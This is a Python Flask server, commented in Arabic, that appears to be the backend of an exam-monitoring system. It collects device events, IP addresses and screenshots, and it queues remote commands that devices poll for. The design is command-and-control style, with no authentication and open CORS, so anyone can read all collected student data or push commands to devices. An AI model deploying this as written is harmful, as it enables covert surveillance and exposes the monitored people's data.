from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS  # مهم جداً للسماح بالتحكم عن بعد
import json
from datetime import datetime, timedelta
import os
from collections import defaultdict
import threading
import time

app = Flask(__name__)
# تفعيل CORS للسماح بالاتصال من أي ملف HTML خارجي أو محلي
CORS(app, resources={r"/*": {"origins": "*"}})

# ملف تخزين البيانات
DATA_FILE = '/tmp/exam_tracking_data.json'
COMMANDS_FILE = '/tmp/exam_commands.json'

students = defaultdict(dict)
pending_commands = defaultdict(list)

def load_data():
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                for k, v in data.items(): students[k] = v
        if os.path.exists(COMMANDS_FILE):
            with open(COMMANDS_FILE, 'r') as f:
                data = json.load(f)
                for k, v in data.items(): pending_commands[k] = v
    except Exception as e:
        print(f"📂 Load Error: {e}")

def save_data():
    try:
        with open(DATA_FILE, 'w') as f: json.dump(dict(students), f)
        with open(COMMANDS_FILE, 'w') as f: json.dump(dict(pending_commands), f)
    except Exception as e:
        print(f"💾 Save Error: {e}")

load_data()

@app.route('/', methods=['GET', 'POST', 'OPTIONS'])
def track():
    """استقبال البيانات بمرونة عالية"""
    if request.method == 'OPTIONS':
        return '', 204
        
    try:
        # محاولة استخراج البيانات مهما كان مصدرها (JSON, Form, Args)
        if request.is_json:
            data = request.json
        else:
            data = request.values.to_dict() or request.args.to_dict()

        if not data:
            return jsonify({"status": "no_data"}), 200

        device_id = data.get('device_id', 'unknown')
        event_type = data.get('event', 'unknown')

        # تحديث سجل الطالب
        students[device_id].update(data)
        students[device_id]['last_update'] = datetime.utcnow().isoformat()
        students[device_id]['ip'] = request.remote_addr
        
        if event_type == 'screenshot_data':
            # حفظ لقطة الشاشة في السجل
            students[device_id]['last_screenshot'] = data.get('img')

        save_data()
        return jsonify({"status": "ok", "device_id": device_id})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/get_commands', methods=['GET'])
def get_commands():
    """هذا المسار الذي يبحث عنه الجهاز لسحب الأوامر"""
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify([])
    
    # جلب الأوامر ومسحها من الانتظار
    cmds = pending_commands.get(device_id, [])
    if cmds:
        pending_commands[device_id] = []
        save_data()
        print(f"📡 الأوامر أرسلت للجهاز: {device_id}")
    
    return jsonify(cmds)

@app.route('/send_command', methods=['POST'])
def send_command():
    """استقبال الأمر من تطبيق الادمن وإضافته للطابور"""
    try:
        data = request.json
        device_id = data.get('device_id')
        cmd_type = data.get('type')
        
        if not device_id or not cmd_type:
            return jsonify({"error": "Missing parameters"}), 400

        # إضافة الأمر للجهاز المطلوب
        pending_commands[device_id].append(data)
        save_data()
        return jsonify({"status": "queued", "device_id": device_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/students')
def api_students():
    # إعادة البيانات للادمن
    return jsonify(list(students.values()))

# أضف مسارات عرض الصور والإحصائيات هنا كما في كودك السابق...

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
